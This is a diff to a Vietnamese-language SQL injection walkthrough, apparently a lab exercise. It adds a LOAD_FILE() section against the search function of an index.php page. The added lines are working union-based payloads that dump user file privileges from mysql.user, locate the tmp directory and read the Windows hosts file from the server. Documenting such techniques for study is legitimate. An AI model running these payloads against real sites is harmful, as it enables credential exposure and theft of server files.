@@ -2,6 +2,7 @@ Người thực hiện: Lê Trần Văn Chương.
 Ngày: 05/04/2022.
 Mục lục:
 - Khai thác SQLi Union Based chức năng search ở trang index.php
+- LOAD_FILE()
 ## Khai thác SQLi Union Based chức năng search ở trang index.php
 1. Kiểm tra xem có tổng cộng bao nhiêu cột dữ liệu trong bảng của DB.
 `' ORDER BY 14 #` 
@@ -56,3 +57,15 @@ Mục lục:
 13.  Ví dụ: tôi khai thác cột `name` và `extension` của bảng `payload`.
 `' UNION SELECT  name,extension,3,4,5,6,7,8,9,10,11,12,13,14 FROM payload  #`
 ![Hinh 12.](~/../img/12.png)
+
+## LOAD_FILE()
+1. Đầu tiên, xem quyền của user bằng hàm `group_concat(table_name)`
+`' UNION SELECT (SELECT group_concat(user,file_priv) FROM mysql.user),NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #`
+![Hinh 13.](~/../img/13.png)
+
+2. Kiểm tra file `tmp` đang ở đâu
+`' UNION SELECT @@slave_load_tmpdir,NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #` 
+=> `C:\xampp\tmp`
+![Hinh 14.](~/../img/14.png)
+
+`' UNION SELECT load_file("Windows\System32\Drivers\etc\hosts"),NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #`
